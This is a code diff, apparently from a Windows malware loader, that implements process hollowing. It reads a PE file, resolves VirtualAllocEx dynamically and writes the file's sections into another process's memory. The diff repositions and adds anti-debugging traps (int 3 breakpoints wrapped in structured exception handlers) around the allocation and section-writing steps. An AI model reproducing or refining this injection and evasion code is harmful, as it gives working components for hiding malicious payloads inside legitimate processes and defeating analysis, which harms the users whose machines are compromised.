@@ -266,12 +266,13 @@ inline int wmain()
 	ReadFil(src, srcBuffer, srcSize, NULL, NULL);
 	CloseHandle(src);
 
-	/*copy to target*/
-		/*Allocate memory*/
 	__try {
 		__asm int 3;
 	}
 	__except (EXCEPTION_EXECUTE_HANDLER) {}
+	/*copy to target*/
+		/*Allocate memory*/
+
 	PIMAGE_DOS_HEADER srcDosHeader = (PIMAGE_DOS_HEADER)srcBuffer; 
 	PIMAGE_NT_HEADERS srcNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)srcBuffer + srcDosHeader->e_lfanew); 
 	SIZE_T srcImgSize = srcNtHeaders->OptionalHeader.SizeOfImage; 
@@ -289,6 +290,10 @@ inline int wmain()
 	/*
 	My approach here is to keep trying (kill the create process and recall main), be carefull if this operation gets in an inifinite loop , it will crush the program (since the stack is limited)
 	*/
+	__try {
+		__asm int 3;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {}
 	_VirtualAllocEx VirtualAll = find_function_address(kernel32_base, StrVirtualAllocEx);
 #ifdef DEBUG
 	printf("[+] targetimagebase is = %x\n",(DWORD)TargetImageBase);
@@ -321,13 +326,14 @@ inline int wmain()
 	PIMAGE_SECTION_HEADER srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
 
 	/*copying sections*/
-	__try {
-		__asm int 3;
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {}
+	
 	BYTE Section; 
 	for (Section = 0; Section < srcNtHeaders->FileHeader.NumberOfSections; Section++, srcImageSection++)
 	{
+		__try {
+			__asm int 3;
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {}
 		WriteProcessMem(target, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress), (PVOID)((BYTE*)srcBuffer + srcImageSection->PointerToRawData), srcImageSection->SizeOfRawData, NULL);
 #ifdef DEBUG
 		printf("[+] Writing  Section %s to @0x%x\n",srcImageSection->Name, (PVOID)((DWORD)TargetImageBase + srcImageSection->VirtualAddress));
